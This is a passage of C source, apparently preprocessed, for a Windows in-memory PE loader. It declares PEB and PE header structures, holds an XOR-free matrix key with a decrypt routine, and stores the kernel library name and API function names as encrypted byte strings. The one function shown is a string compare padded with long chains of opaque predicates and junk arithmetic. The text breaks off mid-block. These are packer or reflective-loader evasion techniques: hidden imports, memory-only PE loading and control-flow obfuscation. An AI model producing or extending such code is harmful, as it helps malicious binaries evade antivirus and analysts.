typedef unsigned short wchar_t;
typedef unsigned long smiUINT32,*smiLPUINT32;
typedef void *HANDLE;
typedef wchar_t WCHAR;
typedef void *PVOID;
typedef unsigned long DWORD;
typedef char CHAR;
typedef struct HINSTANCE__ *HINSTANCE;
typedef long LONG;
typedef smiUINT32 SNMPAPI_STATUS;
typedef HANDLE HSNMP_ENTITY,*LPHSNMP_ENTITY;
typedef WCHAR *NWPSTR,*LPWSTR,*PWSTR;
typedef const WCHAR *LPCWSTR,*PCWSTR;
typedef int WINBOOL;
typedef PVOID DLL_DIRECTORY_COOKIE, *PDLL_DIRECTORY_COOKIE;
typedef DWORD LCTYPE;
typedef DWORD LCID;
typedef CHAR *NPSTR,*LPSTR,*PSTR;
typedef HINSTANCE HMODULE;
typedef LONG HRESULT;
typedef struct APARTMENT_SHUTDOWN_REGISTRATION_COOKIE__ *APARTMENT_SHUTDOWN_REGISTRATION_COOKIE;
typedef unsigned long MSIHANDLE;
SNMPAPI_STATUS __attribute__((__stdcall__)) SnmpListen (HSNMP_ENTITY hEntity, SNMPAPI_STATUS lStatus);
__attribute__((dllimport)) int __attribute__((__stdcall__)) IdnToNameprepUnicode (DWORD dwFlags, LPCWSTR lpUnicodeCharStr, int cchUnicodeChar, LPWSTR lpNameprepCharStr, int cchNameprepChar);
__attribute__((dllimport)) WINBOOL __attribute__((__stdcall__)) RemoveDllDirectory (DLL_DIRECTORY_COOKIE Cookie);
__attribute__((dllimport)) int __attribute__((__stdcall__)) GetLocaleInfoW (LCID Locale, LCTYPE LCType, LPWSTR lpLCData, int cchData);
__attribute__((dllimport)) DWORD __attribute__((__stdcall__)) GetModuleFileNameA (HMODULE hModule, LPSTR lpFilename, DWORD nSize);
HRESULT __attribute__((__stdcall__)) RoUnregisterForApartmentShutdown (APARTMENT_SHUTDOWN_REGISTRATION_COOKIE regCookie);
MSIHANDLE __attribute__((__stdcall__)) MsiGetActiveDatabase(MSIHANDLE hInstall);

typedef unsigned short wchar_t;
typedef unsigned int size_t;
typedef unsigned long long ULONGLONG;
typedef unsigned long ULONG;
typedef signed long LONG;
typedef unsigned int UINT;
typedef unsigned int UINT_PTR;
typedef signed long LONG_PTR;
typedef unsigned long ULONG_PTR;
typedef UINT_PTR WPARAM;
typedef LONG_PTR LPARAM;
typedef LONG_PTR LRESULT;
typedef unsigned short USHORT;
typedef unsigned char BYTE;
typedef void VOID;
typedef wchar_t *PWSTR;
typedef const wchar_t *PCWSTR;
typedef struct _RTL_USER_PROCESS_PARAMETERS *PRTL_USER_PROCESS_PARAMETERS;
typedef struct _LDR_DATA_TABLE_ENTRY *PLDR_DATA_TABLE_ENTRY;
typedef struct _PEB *PPEB;
typedef VOID (__stdcall *PPS_POST_PROCESS_INIT_ROUTINE)(VOID);
typedef struct _IMAGE_DOS_HEADER *PIMAGE_DOS_HEADER;
typedef struct _IMAGE_NT_HEADERS *PIMAGE_NT_HEADERS;
typedef struct _IMAGE_EXPORT_DIRECTORY *PIMAGE_EXPORT_DIRECTORY;
struct _IMAGE_EXPORT_DIRECTORY
{
  UINT Characteristics;
  UINT TimeDateStamp;
  USHORT MajorVersion;
  USHORT MinorVersion;
  UINT Name;
  UINT Base;
  UINT NumberOfFunctions;
  UINT NumberOfNames;
  UINT AddressOfFunctions;
  UINT AddressOfNames;
  UINT AddressOfNameOrdinals;
};
typedef struct _IMAGE_EXPORT_DIRECTORY IMAGE_EXPORT_DIRECTORY;
typedef unsigned char BYTE;
typedef unsigned short WORD;
typedef unsigned long DWORD;
typedef int BOOL;
typedef void *HANDLE;
typedef struct HINSTANCE__ *HINSTANCE;
typedef HINSTANCE HMODULE;
typedef void *LPVOID;
typedef char *LPSTR;
typedef const char *LPCSTR;
typedef DWORD *LPDWORD;
struct _OVERLAPPED
{
  ULONG_PTR Internal;
  ULONG_PTR InternalHigh;
  union 
  {
    struct 
    {
      DWORD Offset;
      DWORD OffsetHigh;
    } DUMMYSTRUCTNAME;
    void *Pointer;
  } DUMMYUNIONNAME;
  HANDLE hEvent;
};
typedef struct _OVERLAPPED OVERLAPPED;
typedef struct _OVERLAPPED *LPOVERLAPPED;
typedef unsigned long SIZE_T;
typedef void *HANDLE;
typedef struct 
{
  WORD e_magic;
  WORD e_cblp;
  WORD e_cp;
  WORD e_crlc;
  WORD e_cparhdr;
  WORD e_minalloc;
  WORD e_maxalloc;
  WORD e_ss;
  WORD e_sp;
  WORD e_csum;
  WORD e_ip;
  WORD e_cs;
  WORD e_lfarlc;
  WORD e_ovno;
  WORD e_res[4];
  WORD e_oemid;
  WORD e_oeminfo;
  WORD e_res2[10];
  DWORD e_lfanew;
} IMAGE_DOS_HEADER;
typedef struct 
{
  DWORD VirtualAddress;
  DWORD Size;
} IMAGE_DATA_DIRECTORY;
typedef struct 
{
  WORD Machine;
  WORD NumberOfSections;
  DWORD TimeDateStamp;
  DWORD PointerToSymbolTable;
  DWORD NumberOfSymbols;
  WORD SizeOfOptionalHeader;
  WORD Characteristics;
} IMAGE_FILE_HEADER;
typedef struct 
{
  WORD Magic;
  BYTE MajorLinkerVersion;
  BYTE MinorLinkerVersion;
  DWORD SizeOfCode;
  DWORD SizeOfInitializedData;
  DWORD SizeOfUninitializedData;
  DWORD AddressOfEntryPoint;
  DWORD BaseOfCode;
  DWORD BaseOfData;
  DWORD ImageBase;
  DWORD SectionAlignment;
  DWORD FileAlignment;
  WORD MajorOperatingSystemVersion;
  WORD MinorOperatingSystemVersion;
  WORD MajorImageVersion;
  WORD MinorImageVersion;
  WORD MajorSubsystemVersion;
  WORD MinorSubsystemVersion;
  DWORD Win32VersionValue;
  DWORD SizeOfImage;
  DWORD SizeOfHeaders;
  DWORD CheckSum;
  WORD Subsystem;
  WORD DllCharacteristics;
  DWORD SizeOfStackReserve;
  DWORD SizeOfStackCommit;
  DWORD SizeOfHeapReserve;
  DWORD SizeOfHeapCommit;
  DWORD LoaderFlags;
  DWORD NumberOfRvaAndSizes;
  IMAGE_DATA_DIRECTORY DataDirectory[16];
} IMAGE_OPTIONAL_HEADER;
typedef struct 
{
  DWORD Signature;
  IMAGE_FILE_HEADER FileHeader;
  IMAGE_OPTIONAL_HEADER OptionalHeader;
} IMAGE_NT_HEADERS;
typedef struct 
{
  BYTE Name[8];
  union 
  {
    DWORD PhysicalAddress;
    DWORD VirtualSize;
  } Misc;
  DWORD VirtualAddress;
  DWORD SizeOfRawData;
  DWORD PointerToRawData;
  DWORD PointerToRelocations;
  DWORD PointerToLinenumbers;
  WORD NumberOfRelocations;
  WORD NumberOfLinenumbers;
  DWORD Characteristics;
} IMAGE_SECTION_HEADER;
typedef struct 
{
  DWORD OriginalFirstThunk;
  DWORD TimeDateStamp;
  DWORD ForwarderChain;
  DWORD Name;
  DWORD FirstThunk;
} IMAGE_IMPORT_DESCRIPTOR;
typedef struct 
{
  union 
  {
    DWORD Function;
    DWORD Ordinal;
    DWORD AddressOfData;
  } u1;
} IMAGE_THUNK_DATA;
typedef struct 
{
  WORD Hint;
  BYTE Name[1];
} IMAGE_IMPORT_BY_NAME;
typedef struct 
{
  DWORD VirtualAddress;
  DWORD SizeOfBlock;
} IMAGE_BASE_RELOCATION;
typedef void *HANDLE;
BOOL __stdcall VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
HANDLE __stdcall GetStdHandle(DWORD nStdHandle);
BOOL __stdcall WriteFile(HANDLE hFile, const void *lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
HANDLE __stdcall GetProcessHeap(void);
LPVOID __stdcall HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
BOOL __stdcall HeapFree(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
BOOL __stdcall VirtualProtect(LPVOID, DWORD, DWORD, DWORD *);
LPVOID __stdcall VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
HMODULE __stdcall GetModuleHandleA(const char *);
HMODULE __stdcall LoadLibraryA(const char *);
void * __stdcall GetProcAddress(HMODULE, const char *);
typedef unsigned long ULONG;
typedef unsigned long *PULONG;
typedef void *PVOID;
struct _LIST_ENTRY
{
  struct _LIST_ENTRY *Flink;
  struct _LIST_ENTRY *Blink;
};
typedef struct _LIST_ENTRY LIST_ENTRY;
typedef struct _LIST_ENTRY *PLIST_ENTRY;
typedef struct _LIST_ENTRY * restrict PRLIST_ENTRY;
struct _SINGLE_LIST_ENTRY
{
  struct _SINGLE_LIST_ENTRY *Next;
};
typedef struct _SINGLE_LIST_ENTRY SINGLE_LIST_ENTRY;
typedef struct _SINGLE_LIST_ENTRY *PSINGLE_LIST_ENTRY;
struct _UNICODE_STRING
{
  USHORT Length;
  USHORT MaximumLength;
  PWSTR Buffer;
};
typedef struct _UNICODE_STRING UNICODE_STRING;
struct _PEB_LDR_DATA
{
  BYTE Reserved1[8];
  PVOID Reserved2[3];
  LIST_ENTRY InMemoryOrderModuleList;
};
typedef struct _PEB_LDR_DATA PEB_LDR_DATA;
typedef struct _PEB_LDR_DATA *PPEB_LDR_DATA;
struct _LDR_DATA_TABLE_ENTRY
{
  PVOID Reserved1[2];
  LIST_ENTRY InMemoryOrderLinks;
  PVOID Reserved2[2];
  PVOID DllBase;
  PVOID Reserved3[2];
  UNICODE_STRING FullDllName;
  BYTE Reserved4[8];
  PVOID Reserved5[3];
  union 
  {
    ULONG CheckSum;
    PVOID Reserved6;
  };
  ULONG TimeDateStamp;
};
typedef struct _LDR_DATA_TABLE_ENTRY LDR_DATA_TABLE_ENTRY;
typedef struct _LDR_DATA_TABLE_ENTRY *PLDR_DATA_TABLE_ENTRY;
typedef VOID (__stdcall *PPS_POST_PROCESS_INIT_ROUTINE)(VOID);
struct _PEB
{
  BYTE Reserved1[2];
  BYTE BeingDebugged;
  BYTE Reserved2[1];
  PVOID Reserved3[2];
  PPEB_LDR_DATA Ldr;
  PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
  PVOID Reserved4[3];
  PVOID AtlThunkSListPtr;
  PVOID Reserved5;
  ULONG Reserved6;
  PVOID Reserved7;
  ULONG Reserved8;
  ULONG AtlThunkSListPtr32;
  PVOID Reserved9[45];
  BYTE Reserved10[96];
  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
  BYTE Reserved11[128];
  PVOID Reserved12[1];
  ULONG SessionId;
};
typedef struct _PEB PEB;
typedef struct _PEB *PPEB;
struct _RTL_USER_PROCESS_PARAMETERS
{
  BYTE Reserved1[16];
  PVOID Reserved2[10];
  UNICODE_STRING ImagePathName;
  UNICODE_STRING CommandLine;
};
typedef struct _RTL_USER_PROCESS_PARAMETERS RTL_USER_PROCESS_PARAMETERS;
typedef struct _RTL_USER_PROCESS_PARAMETERS *PRTL_USER_PROCESS_PARAMETERS;
const int key_matrix_inverse[4][4] = {{31, 48, 71, 153}, {3, 107, 142, 219}, {235, 94, 137, 86}, {176, 202, 255, 180}};
int data_matrix[4][4] = {0};
int last_matrix[4][4] = {0};
int tmp_matrix[4][4] = {0};
const int iv_length = 16;
void decrypt_data(char *src, DWORD size);
typedef struct in_memory_pe in_memory_pe;
struct in_memory_pe
{
  IMAGE_DOS_HEADER *pe_dos_header;
  IMAGE_NT_HEADERS *pe_nt_header;
  IMAGE_SECTION_HEADER *sections;
  IMAGE_DATA_DIRECTORY *data_directory;
  IMAGE_IMPORT_DESCRIPTOR *import_descriptors;
  char *data;
  void *entry_point;
};
PPEB peb_windows_structure = 0;
void *kernel_library_address = 0;
int number_kernel_library_functions = 11;
void *kernel_library_function_addresses[11] = {};
char encrypted_kernel_library_name[] = "\xa5\xb6\x23\x9a\x04\xd6\x56\x34\x21\xe6\xef\x09\xca\x7e\xb6\x64\xf5\x50\x46\xf5\x83\x00\x9a\x99\xec\xf8\x44\x7b\x01\xa0\xc7\xbf\x53\x89\x2a\x49\x73\x59\xf6\x0d\x0a\x01\x97\x46\x3d\x60\xbf\xe2";
int size_encrypted_kernel_library_name = 48;
const wchar_t *kernel_library_name = 0;
char encrypted_kernel_library_function_names[] = "\x10\x05\x4a\xee\x71\xe4\x20\xa4\x76\x16\xf0\xbb\x0e\x5e\xdb\x2a\x19\x2e\xc8\x35\xa8\xb1\xdb\xca\x3e\x68\x26\x4b\xd7\x11\xf3\x24\xa1\xef\x74\x91\xba\x6d\x3f\x48\xb6\x65\x0b\xd3\x6d\xe6\xc9\xbe\x2d\xdb\xc4\xca\x71\xef\xec\x27\xbd\xf7\x0c\x06\xf8\xfc\xb7\xb2\xb5\x46\x24\x98\x8b\x95\x07\x6c\x88\x17\x9f\xac\x3b\x3e\xa9\x53\x60\xd4\xa7\x35\x86\xc6\xcc\xd2\x5a\xa7\x9d\x6e\xf2\x5e\x3d\xf5\xc1\xe2\x32\xf6\x98\xb2\x1e\x79\x22\x24\x92\x61\xe4\x69\x52\xf0\x5b\xeb\xef\x1b\xd3\x23\x22\xcd\x9a\xee\xc9\x8e\xab\xe0\x0b\x37\x9b\xb6\x62\xb8\xbd\x26\x5d\x19\x9a\x82\xe3\x35\x31\x22\xe3\x64\x63\x4f\xe3\xaf\x68\xd8\x05\x3e\x73\xbb\xe9\x92\xaa\x73\x7d\x73";
int size_encrypted_kernel_library_function_names = 160;
const char *kernel_library_function_names = 0;
static HANDLE global_windows_heap = 0;
int replacement_string(const char *s1, const char *s2)
{
  unsigned int v73fb19f14e84291005bef6d31be80649_useless_opaque = (unsigned int) 3250975076;
  unsigned int vcded443be35d018a8e321e5555b7d5f6_random_opaque = (unsigned int) (&v73fb19f14e84291005bef6d31be80649_useless_opaque);
  {
    {
      unsigned int v91d0735c8921834b5c3d0957d2be0ca6_useless_opaque = (unsigned int) 4252483511;
      unsigned int v1bd37038f29d14f1fc55181aad6b5111_computation_opaque = (unsigned int) (&v91d0735c8921834b5c3d0957d2be0ca6_useless_opaque);
      unsigned int v0dc8402dd1328a1bf1adb39933526b15_true_opaque = (((v1bd37038f29d14f1fc55181aad6b5111_computation_opaque * v1bd37038f29d14f1fc55181aad6b5111_computation_opaque) + v1bd37038f29d14f1fc55181aad6b5111_computation_opaque) % ((unsigned int) 2)) == ((unsigned int) 0);
      {
        while ((*s1) && ((*s1) == (*s2)))
        {
          s1++;
          s2++;
        }

        unsigned int v477d2f259b7760ff49a8808d8e565b02_useless_opaque = (unsigned int) 3549916363;
        unsigned int v1172069dffbdc987e7cee3ef2c6046cb_computation_opaque = (unsigned int) (&v477d2f259b7760ff49a8808d8e565b02_useless_opaque);
        unsigned int vc6cc9df1424fa1f5d55e4783eeee2eb7_true_opaque = (((v1172069dffbdc987e7cee3ef2c6046cb_computation_opaque * v1172069dffbdc987e7cee3ef2c6046cb_computation_opaque) + v1172069dffbdc987e7cee3ef2c6046cb_computation_opaque) % ((unsigned int) 2)) == ((unsigned int) 0);
        return ((unsigned char) (*s1)) - ((unsigned char) (*s2));
        if ((((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 9)) + ((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 16))) == ((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 25)))
        {
          if (v0dc8402dd1328a1bf1adb39933526b15_true_opaque)
          {
            if (vc6cc9df1424fa1f5d55e4783eeee2eb7_true_opaque)
            {
              if (!((((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 9)) + ((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 16))) == ((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 25))))
              {
                v1172069dffbdc987e7cee3ef2c6046cb_computation_opaque = v0dc8402dd1328a1bf1adb39933526b15_true_opaque - v1bd37038f29d14f1fc55181aad6b5111_computation_opaque;
                v0dc8402dd1328a1bf1adb39933526b15_true_opaque = v91d0735c8921834b5c3d0957d2be0ca6_useless_opaque | ((unsigned int) 121);
                v91d0735c8921834b5c3d0957d2be0ca6_useless_opaque = vcded443be35d018a8e321e5555b7d5f6_random_opaque | ((unsigned int) 79);
                if (!((((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 9)) + ((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 16))) == ((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 25))))
                {
                  vc6cc9df1424fa1f5d55e4783eeee2eb7_true_opaque = vc6cc9df1424fa1f5d55e4783eeee2eb7_true_opaque % v73fb19f14e84291005bef6d31be80649_useless_opaque;
                  vcded443be35d018a8e321e5555b7d5f6_random_opaque = v73fb19f14e84291005bef6d31be80649_useless_opaque | v1172069dffbdc987e7cee3ef2c6046cb_computation_opaque;
                  vcded443be35d018a8e321e5555b7d5f6_random_opaque = v91d0735c8921834b5c3d0957d2be0ca6_useless_opaque % v73fb19f14e84291005bef6d31be80649_useless_opaque;
                  v477d2f259b7760ff49a8808d8e565b02_useless_opaque = v91d0735c8921834b5c3d0957d2be0ca6_useless_opaque | v1bd37038f29d14f1fc55181aad6b5111_computation_opaque;
                  v1172069dffbdc987e7cee3ef2c6046cb_computation_opaque = v1172069dffbdc987e7cee3ef2c6046cb_computation_opaque / vcded443be35d018a8e321e5555b7d5f6_random_opaque;
                  if (!vc6cc9df1424fa1f5d55e4783eeee2eb7_true_opaque)
                  {
                    v91d0735c8921834b5c3d0957d2be0ca6_useless_opaque = v91d0735c8921834b5c3d0957d2be0ca6_useless_opaque <= v1172069dffbdc987e7cee3ef2c6046cb_computation_opaque;
                    v0dc8402dd1328a1bf1adb39933526b15_true_opaque = vc6cc9df1424fa1f5d55e4783eeee2eb7_true_opaque / vcded443be35d018a8e321e5555b7d5f6_random_opaque;
                    v73fb19f14e84291005bef6d31be80649_useless_opaque = vcded443be35d018a8e321e5555b7d5f6_random_opaque == ((unsigned int) 65);
                    v1bd37038f29d14f1fc55181aad6b5111_computation_opaque = v73fb19f14e84291005bef6d31be80649_useless_opaque % v1bd37038f29d14f1fc55181aad6b5111_computation_opaque;
                    v91d0735c8921834b5c3d0957d2be0ca6_useless_opaque = v73fb19f14e84291005bef6d31be80649_useless_opaque - v1bd37038f29d14f1fc55181aad6b5111_computation_opaque;
                    v477d2f259b7760ff49a8808d8e565b02_useless_opaque = v477d2f259b7760ff49a8808d8e565b02_useless_opaque || v1172069dffbdc987e7cee3ef2c6046cb_computation_opaque;
                  }
                  v0dc8402dd1328a1bf1adb39933526b15_true_opaque = v477d2f259b7760ff49a8808d8e565b02_useless_opaque - v1172069dffbdc987e7cee3ef2c6046cb_computation_opaque;
                  vc6cc9df1424fa1f5d55e4783eeee2eb7_true_opaque = v477d2f259b7760ff49a8808d8e565b02_useless_opaque + vcded443be35d018a8e321e5555b7d5f6_random_opaque;
                }
                vcded443be35d018a8e321e5555b7d5f6_random_opaque = v91d0735c8921834b5c3d0957d2be0ca6_useless_opaque * v477d2f259b7760ff49a8808d8e565b02_useless_opaque;
                if (!vc6cc9df1424fa1f5d55e4783eeee2eb7_true_opaque)
                {
                  vc6cc9df1424fa1f5d55e4783eeee2eb7_true_opaque = vc6cc9df1424fa1f5d55e4783eeee2eb7_true_opaque < v73fb19f14e84291005bef6d31be80649_useless_opaque;
                }
                v0dc8402dd1328a1bf1adb39933526b15_true_opaque = v477d2f259b7760ff49a8808d8e565b02_useless_opaque || v0dc8402dd1328a1bf1adb39933526b15_true_opaque;
                v477d2f259b7760ff49a8808d8e565b02_useless_opaque = v477d2f259b7760ff49a8808d8e565b02_useless_opaque <= v91d0735c8921834b5c3d0957d2be0ca6_useless_opaque;
                if ((((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 9)) + ((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 16))) == ((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 25)))
                {
                  if ((((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 9)) + ((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 16))) == ((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 25)))
                  {
                    v1172069dffbdc987e7cee3ef2c6046cb_computation_opaque = v91d0735c8921834b5c3d0957d2be0ca6_useless_opaque == v1bd37038f29d14f1fc55181aad6b5111_computation_opaque;
                  }
                  if (!vc6cc9df1424fa1f5d55e4783eeee2eb7_true_opaque)
                  {
                    v0dc8402dd1328a1bf1adb39933526b15_true_opaque = v73fb19f14e84291005bef6d31be80649_useless_opaque / v0dc8402dd1328a1bf1adb39933526b15_true_opaque;
                    v477d2f259b7760ff49a8808d8e565b02_useless_opaque = v0dc8402dd1328a1bf1adb39933526b15_true_opaque * ((unsigned int) 94);
                    v73fb19f14e84291005bef6d31be80649_useless_opaque = v0dc8402dd1328a1bf1adb39933526b15_true_opaque <= ((unsigned int) 19);
                    v1172069dffbdc987e7cee3ef2c6046cb_computation_opaque = vcded443be35d018a8e321e5555b7d5f6_random_opaque || vc6cc9df1424fa1f5d55e4783eeee2eb7_true_opaque;
                  }
                }
              }
            }
          }
        }
      }
      unsigned int v6756fdbca6b9beb623df81e3f84e81e5_useless_opaque = (unsigned int) 4057924172;
      unsigned int v0c1b607519b8560655fc0c899d1eec14_computation_opaque = (unsigned int) 0;
      unsigned int vc4ec49eb090f410a1dad1511dc0057e9_computation_opaque = (unsigned int) 3;
      unsigned int v58732a9fc5081e5c8c58afaac37db1f5_computation_opaque = (unsigned int) (&v6756fdbca6b9beb623df81e3f84e81e5_useless_opaque);
      v58732a9fc5081e5c8c58afaac37db1f5_computation_opaque = (v58732a9fc5081e5c8c58afaac37db1f5_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
      if (v58732a9fc5081e5c8c58afaac37db1f5_computation_opaque < ((unsigned int) 3))
      {
        if ((((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 9)) + ((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 16))) == ((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 25)))
        {
          if (!((((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 9)) + ((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 16))) == ((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 25))))
          {
            v1bd37038f29d14f1fc55181aad6b5111_computation_opaque = vcded443be35d018a8e321e5555b7d5f6_random_opaque <= v91d0735c8921834b5c3d0957d2be0ca6_useless_opaque;
            vc4ec49eb090f410a1dad1511dc0057e9_computation_opaque = vcded443be35d018a8e321e5555b7d5f6_random_opaque * v73fb19f14e84291005bef6d31be80649_useless_opaque;
            if (!((((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 9)) + ((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 16))) == ((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 25))))
            {
              v0c1b607519b8560655fc0c899d1eec14_computation_opaque = v1bd37038f29d14f1fc55181aad6b5111_computation_opaque % v58732a9fc5081e5c8c58afaac37db1f5_computation_opaque;
              if (!v0dc8402dd1328a1bf1adb39933526b15_true_opaque)
              {
                v91d0735c8921834b5c3d0957d2be0ca6_useless_opaque = vc4ec49eb090f410a1dad1511dc0057e9_computation_opaque / v1bd37038f29d14f1fc55181aad6b5111_computation_opaque;
                v58732a9fc5081e5c8c58afaac37db1f5_computation_opaque = vcded443be35d018a8e321e5555b7d5f6_random_opaque + v1bd37038f29d14f1fc55181aad6b5111_computation_opaque;
                v0dc8402dd1328a1bf1adb39933526b15_true_opaque = v6756fdbca6b9beb623df81e3f84e81e5_useless_opaque + ((unsigned int) 116);
                v6756fdbca6b9beb623df81e3f84e81e5_useless_opaque = v6756fdbca6b9beb623df81e3f84e81e5_useless_opaque - ((unsigned int) 114);
                v0dc8402dd1328a1bf1adb39933526b15_true_opaque = v91d0735c8921834b5c3d0957d2be0ca6_useless_opaque / v0c1b607519b8560655fc0c899d1eec14_computation_opaque;
                v6756fdbca6b9beb623df81e3f84e81e5_useless_opaque = vcded443be35d018a8e321e5555b7d5f6_random_opaque % v91d0735c8921834b5c3d0957d2be0ca6_useless_opaque;
                v73fb19f14e84291005bef6d31be80649_useless_opaque = v6756fdbca6b9beb623df81e3f84e81e5_useless_opaque / v58732a9fc5081e5c8c58afaac37db1f5_computation_opaque;
              }
              v6756fdbca6b9beb623df81e3f84e81e5_useless_opaque = v1bd37038f29d14f1fc55181aad6b5111_computation_opaque != v0dc8402dd1328a1bf1adb39933526b15_true_opaque;
            }
            if (v0dc8402dd1328a1bf1adb39933526b15_true_opaque)
            {
              v6756fdbca6b9beb623df81e3f84e81e5_useless_opaque = v1bd37038f29d14f1fc55181aad6b5111_computation_opaque + v58732a9fc5081e5c8c58afaac37db1f5_computation_opaque;
              v6756fdbca6b9beb623df81e3f84e81e5_useless_opaque = vc4ec49eb090f410a1dad1511dc0057e9_computation_opaque / v73fb19f14e84291005bef6d31be80649_useless_opaque;
            }
          }
          if (v0dc8402dd1328a1bf1adb39933526b15_true_opaque)
          {
            if ((((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 9)) + ((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 16))) == ((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 25)))
            {
              if (!v0dc8402dd1328a1bf1adb39933526b15_true_opaque)
              {
                v0dc8402dd1328a1bf1adb39933526b15_true_opaque = vc4ec49eb090f410a1dad1511dc0057e9_computation_opaque + v0dc8402dd1328a1bf1adb39933526b15_true_opaque;
                v73fb19f14e84291005bef6d31be80649_useless_opaque = vc4ec49eb090f410a1dad1511dc0057e9_computation_opaque <= ((unsigned int) 106);
                v1bd37038f29d14f1fc55181aad6b5111_computation_opaque = v1bd37038f29d14f1fc55181aad6b5111_computation_opaque + v58732a9fc5081e5c8c58afaac37db1f5_computation_opaque;
              }
              if (v0dc8402dd1328a1bf1adb39933526b15_true_opaque)
              {
                if ((((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 9)) + ((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 16))) == ((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 25)))
                {
                  v58732a9fc5081e5c8c58afaac37db1f5_computation_opaque = (unsigned int) 3;
                }
              }
            }
          }
        }
        if (!v0dc8402dd1328a1bf1adb39933526b15_true_opaque)
        {
          v58732a9fc5081e5c8c58afaac37db1f5_computation_opaque = v0c1b607519b8560655fc0c899d1eec14_computation_opaque % v1bd37038f29d14f1fc55181aad6b5111_computation_opaque;
          v73fb19f14e84291005bef6d31be80649_useless_opaque = v58732a9fc5081e5c8c58afaac37db1f5_computation_opaque % vcded443be35d018a8e321e5555b7d5f6_random_opaque;
          if (!v0dc8402dd1328a1bf1adb39933526b15_true_opaque)
          {
            v6756fdbca6b9beb623df81e3f84e81e5_useless_opaque = v58732a9fc5081e5c8c58afaac37db1f5_computation_opaque / v73fb19f14e84291005bef6d31be80649_useless_opaque;
            v73fb19f14e84291005bef6d31be80649_useless_opaque = vc4ec49eb090f410a1dad1511dc0057e9_computation_opaque != ((unsigned int) 46);
            vc4ec49eb090f410a1dad1511dc0057e9_computation_opaque = v58732a9fc5081e5c8c58afaac37db1f5_computation_opaque || v6756fdbca6b9beb623df81e3f84e81e5_useless_opaque;
            if (!v0dc8402dd1328a1bf1adb39933526b15_true_opaque)
            {
              v0dc8402dd1328a1bf1adb39933526b15_true_opaque = vcded443be35d018a8e321e5555b7d5f6_random_opaque + v0dc8402dd1328a1bf1adb39933526b15_true_opaque;
              if (!v0dc8402dd1328a1bf1adb39933526b15_true_opaque)
              {
                v58732a9fc5081e5c8c58afaac37db1f5_computation_opaque = v73fb19f14e84291005bef6d31be80649_useless_opaque * v6756fdbca6b9beb623df81e3f84e81e5_useless_opaque;
